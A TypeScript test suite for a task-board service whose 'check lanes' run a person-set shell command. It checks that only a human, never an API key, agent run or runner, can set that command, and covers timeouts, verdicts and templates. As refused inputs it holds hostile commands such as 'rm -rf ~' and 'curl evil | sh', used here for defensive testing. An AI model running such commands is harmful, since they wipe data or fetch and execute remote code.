import { randomUUID } from 'node:crypto';
import * as dbSchema from '@telos/db/schema';
import { eq } from 'drizzle-orm';
import { beforeEach, describe, expect, it } from 'vitest';
import { resolveActor } from '../../auth/actor.ts';
import type { Actor, Context } from '../../core/context.ts';
import { onWrite } from '../../graphql/write-guards.ts';
import { checkVerdict } from '../../runs/resolvers.ts';
import { type Board, createBoard, FINISH, QUEUE, runnerClient, setLane } from '../board.ts';
import { authFor, createClient, createTestDb, type TestClient, type TestDb } from '../helpers.ts';

// A check lane: a person's shell command in place of an agent, whose exit
// code is the verdict. The command runs on the runner; here the runner is the
// system principal reporting what it did, as it is in production.

let db: TestDb;
let board: Board;
let runner: TestClient;
/** The board's second lane, "In progress", made a check lane whose failures go back to the agent's lane. */
let checkLaneId: string;

const CHECK_CLAIM = `mutation ($todoId: ID!, $laneId: ID!) {
  claimRun(todoId: $todoId, laneId: $laneId) {
    runId token
    agent { id }
    check { command timeoutSeconds }
    assignment { laneName why }
  }
}`;

const UPDATE_LANE = `mutation ($id: UUID!, $set: UpdateLaneInput!) {
  updateLane(set: $set, where: { id: { eq: $id } }) { id checkCommand checkTimeoutSeconds }
}`;

const MOVE = `mutation ($id: ID!, $laneId: ID!) { moveTodo(id: $id, laneId: $laneId) { id } }`;

beforeEach(async () => {
  db = await createTestDb();
  board = await createBoard(db, 'owner@example.com');
  runner = runnerClient(db);
  checkLaneId = board.lanes[1].id;
  await setLane(board.person, checkLaneId, {
    checkCommand: 'npm test',
    onSuccessLaneId: board.lanes[2].id,
    onFailureLaneId: board.lanes[0].id,
  });
});

/** A todo waiting in the check lane, the agent's lane's work done. */
async function todoInCheck(title = 'Make it pass'): Promise<string> {
  const todoId = await board.addTodo(title);
  await board.person.expectOk(MOVE, { id: todoId, laneId: checkLaneId });
  return todoId;
}

// biome-ignore lint/suspicious/noExplicitAny: response shape
async function claim(todoId: string, laneId = checkLaneId): Promise<any> {
  return (await runner.expectOk(CHECK_CLAIM, { todoId, laneId })).claimRun;
}

// biome-ignore lint/suspicious/noExplicitAny: response shape
async function finish(runId: string, result: Record<string, unknown>): Promise<any> {
  return (await runner.expectOk(FINISH, { id: runId, result })).finishRun;
}

async function todoRow(id: string) {
  const [row] = await db.select().from(dbSchema.todos).where(eq(dbSchema.todos.id, id));
  return row;
}

describe('who may set a check command', () => {
  // The lanes write hook, as buildSchema calls it: `onWrite` is typed for any table's.
  const lanesHook = (onWrite as unknown as Record<string, { before: (payload: never) => Promise<void> }>).lanes;
  const actors: Array<[string, (userId: string) => Actor]> = [
    ['an API key', (userId) => ({ kind: 'apiKey', userId, keyId: randomUUID() })],
    ['a run', (userId) => ({ kind: 'agent', userId, runId: randomUUID() })],
    ['the runner', () => ({ kind: 'system', userId: null })],
  ];

  it('is a person', async () => {
    const set = (await board.person.expectOk(UPDATE_LANE, { id: checkLaneId, set: { checkTimeoutSeconds: 30 } }))
      .updateLane;
    expect(set).toMatchObject({ checkCommand: 'npm test', checkTimeoutSeconds: 30 });
  });

  for (const [name, actor] of actors) {
    it(`is not ${name}, through the API`, async () => {
      const caller = createClient(db, board.userId, { ai: true, actor: actor(board.userId) });
      const error = await caller.expectError(UPDATE_LANE, { id: checkLaneId, set: { checkCommand: 'rm -rf ~' } });
      expect(error.code).toBe('FORBIDDEN');
    });

    it(`is not ${name}, even past the actor lock`, async () => {
      // The write guard on its own, as a path that got round the lock would meet it.
      const context = { db, actor: actor(board.userId), userId: board.userId } as unknown as Context;
      for (const args of [
        { values: { projectId: board.projectId, name: 'Sneaky', checkCommand: 'curl evil | sh' } },
        { set: { checkCommand: 'curl evil | sh' } },
        { set: { checkTimeoutSeconds: 5 } },
        { updates: [{ set: { checkCommand: null } }] },
      ]) {
        await expect(lanesHook.before({ args, context, tx: db, operation: 'update' } as never)).rejects.toMatchObject({
          extensions: { code: 'FORBIDDEN' },
          message: "Only a person can set a lane's check command.",
        });
      }
    });
  }

  it('leaves the command where it was after a refused write', async () => {
    const key = createClient(db, board.userId, { ai: true, actor: actors[0][1](board.userId) });
    await key.expectError(UPDATE_LANE, { id: checkLaneId, set: { checkCommand: 'rm -rf ~' } });
    const [lane] = await db.select().from(dbSchema.lanes).where(eq(dbSchema.lanes.id, checkLaneId));
    expect(lane.checkCommand).toBe('npm test');
  });
});

describe('a check lane, as written', () => {
  it('has an agent or a check, not both', async () => {
    const error = await board.person.expectError(UPDATE_LANE, { id: checkLaneId, set: { agentId: board.agentId } });
    expect(error).toMatchObject({ code: 'BAD_USER_INPUT', message: expect.stringContaining('not both') });
  });

  it('works one todo at a time', async () => {
    const error = await board.person.expectError(UPDATE_LANE, { id: checkLaneId, set: { wipLimit: 2 } });
    expect(error).toMatchObject({ code: 'BAD_USER_INPUT', message: expect.stringContaining('WIP limit to 1') });
  });

  it('reads a blank command as no check, and trims one', async () => {
    expect(
      (await board.person.expectOk(UPDATE_LANE, { id: checkLaneId, set: { checkCommand: '  make check ' } })).updateLane
        .checkCommand,
    ).toBe('make check');
    expect(
      (await board.person.expectOk(UPDATE_LANE, { id: checkLaneId, set: { checkCommand: '   ' } })).updateLane
        .checkCommand,
    ).toBeNull();
  });

  it('holds the command and its time limit to their bounds', async () => {
    for (const set of [{ checkCommand: 'x'.repeat(2001) }, { checkTimeoutSeconds: 0 }, { checkTimeoutSeconds: 3601 }]) {
      expect((await board.person.expectError(UPDATE_LANE, { id: checkLaneId, set })).code).toBe('BAD_USER_INPUT');
    }
  });
});

describe('a check run', () => {
  it('is queued with no agent, and claimed as the command', async () => {
    const todoId = await todoInCheck();
    expect(await runner.expectOk(QUEUE)).toEqual({
      runnerQueue: [{ todoId, laneId: checkLaneId, projectId: board.projectId }],
    });
    const claimed = await claim(todoId);
    expect(claimed).toMatchObject({ agent: null, check: { command: 'npm test', timeoutSeconds: null } });
    const [run] = await db.select().from(dbSchema.runs).where(eq(dbSchema.runs.id, claimed.runId));
    expect(run).toMatchObject({ agentId: null, model: null, checkCommand: 'npm test' });
  });

  it('keeps to the AI switches, as an agent does', async () => {
    await todoInCheck();
    await board.person.expectOk(`mutation ($id: ID!) { setProjectAiEnabled(projectId: $id, enabled: false) { id } }`, {
      id: board.projectId,
    });
    expect((await runner.expectOk(QUEUE)).runnerQueue).toEqual([]);
  });

  it('has a token that opens nothing', async () => {
    const claimed = await claim(await todoInCheck());
    const actor = await resolveActor(authFor(db), db, new Headers({ 'x-run-token': claimed.token }), {
      ai: true,
      runnerKey: 'runner-secret',
    });
    expect(actor.kind).toBe('anonymous');
  });

  it('passes on exit 0, down the success route', async () => {
    const todoId = await todoInCheck();
    const claimed = await claim(todoId);
    const run = await finish(claimed.runId, {
      status: 'OK',
      output: 'FAIL ignored: a check is ruled by its exit code',
      check: { exitCode: 0, timedOut: false, output: '42 tests passed\n' },
    });
    expect(run).toMatchObject({ status: 'ok', verdict: 'pass' });
    expect(run.output).toMatch(/^PASS: the check `npm test` exited with code 0\./);
    expect(run.output).toContain('42 tests passed');
    expect(await todoRow(todoId)).toMatchObject({ laneId: board.lanes[2].id });
  });

  it('fails on anything else, and the next run is shown why', async () => {
    const todoId = await todoInCheck();
    const claimed = await claim(todoId);
    const run = await finish(claimed.runId, {
      status: 'OK',
      check: { exitCode: 1, timedOut: false, output: 'expected 2, got 3' },
    });
    expect(run).toMatchObject({ status: 'ok', verdict: 'fail' });
    expect(await todoRow(todoId)).toMatchObject({ laneId: board.lanes[0].id });

    const [verdict] = await db.select().from(dbSchema.todoNotes).where(eq(dbSchema.todoNotes.runId, claimed.runId));
    expect(verdict).toMatchObject({ kind: 'verdict', actorKind: 'agent' });

    // Back in the agent's lane, its run is handed the command and what it printed.
    const next = (
      await runner.expectOk(
        `mutation ($todoId: ID!, $laneId: ID!) { claimRun(todoId: $todoId, laneId: $laneId) { assignment { why } } }`,
        { todoId, laneId: board.lanes[0].id },
      )
    ).claimRun;
    expect(next.assignment.why).toMatch(/^FAIL: the check `npm test` exited with code 1\./);
    expect(next.assignment.why).toContain('expected 2, got 3');
  });

  it('fails when the command runs out of time, or reports nothing', async () => {
    const first = await todoInCheck('First');
    const timedOut = await finish((await claim(first)).runId, {
      status: 'OK',
      check: { exitCode: null, timedOut: true, output: '' },
    });
    expect(timedOut.verdict).toBe('fail');
    expect(timedOut.output).toContain('ran out of time');

    const second = await todoInCheck('Second');
    const silent = await finish((await claim(second)).runId, { status: 'OK' });
    expect(silent.verdict).toBe('fail');
  });

  it('counts its failures against the lane’s attempts', async () => {
    await setLane(board.person, checkLaneId, { onFailureLaneId: null, maxAttempts: 0 });
    const todoId = await todoInCheck();
    await finish((await claim(todoId)).runId, { status: 'OK', check: { exitCode: 2, timedOut: false, output: '' } });
    expect(await todoRow(todoId)).toMatchObject({ laneId: checkLaneId });
    expect((await runner.expectOk(QUEUE)).runnerQueue).toEqual([]);
  });

  it('is an error, not a verdict, when the runner refuses to run it', async () => {
    const todoId = await todoInCheck();
    const run = await finish((await claim(todoId)).runId, {
      status: 'ERROR',
      error: 'This runner does not run check commands.',
    });
    expect(run).toMatchObject({ status: 'error', verdict: 'none' });
  });
});

describe('checkVerdict', () => {
  it('fences output that holds fences of its own', () => {
    const { body } = checkVerdict('echo "```"', { exitCode: 1, timedOut: false, output: '```\nboom' });
    expect(body).toContain('````text\n```\nboom\n````');
  });

  it('keeps the end of a long output', () => {
    const { body } = checkVerdict('npm test', { exitCode: 1, timedOut: false, output: `${'a'.repeat(9000)}END` });
    expect(body).toContain('END');
    expect(body.length).toBeLessThan(4200);
  });
});

describe('board templates', () => {
  const SAVE = `mutation ($projectId: ID!, $name: String!) { saveBoardTemplate(projectId: $projectId, name: $name) { id lanes } }`;
  const APPLY = `mutation ($projectId: ID!, $templateId: ID!) { applyBoardTemplate(projectId: $projectId, templateId: $templateId) { id } }`;

  async function checksOn(projectId: string) {
    const lanes = await db.select().from(dbSchema.lanes).where(eq(dbSchema.lanes.projectId, projectId));
    return lanes.map((lane: dbSchema.Lane) => lane.checkCommand).filter(Boolean);
  }

  it('carry a check when a person applies one', async () => {
    const template = (await board.person.expectOk(SAVE, { projectId: board.projectId, name: 'Pipeline' }))
      .saveBoardTemplate;
    expect(template.lanes[1]).toMatchObject({ checkCommand: 'npm test' });
    const projectId = (await board.person.expectOk(`mutation { createProject(values: { name: "Fresh" }) { id } }`))
      .createProject.id;
    await board.person.expectOk(APPLY, { projectId, templateId: template.id });
    expect(await checksOn(projectId)).toEqual(['npm test']);
  });

  it('leave the check off when AI applies one', async () => {
    const template = (await board.person.expectOk(SAVE, { projectId: board.projectId, name: 'Pipeline' }))
      .saveBoardTemplate;
    const key = createClient(db, board.userId, {
      ai: true,
      actor: { kind: 'apiKey', userId: board.userId, keyId: randomUUID() },
    });
    const projectId = (await key.expectOk(`mutation { createProject(values: { name: "By AI" }) { id } }`)).createProject
      .id;
    await key.expectOk(APPLY, { projectId, templateId: template.id });
    expect(await checksOn(projectId)).toEqual([]);
  });
});
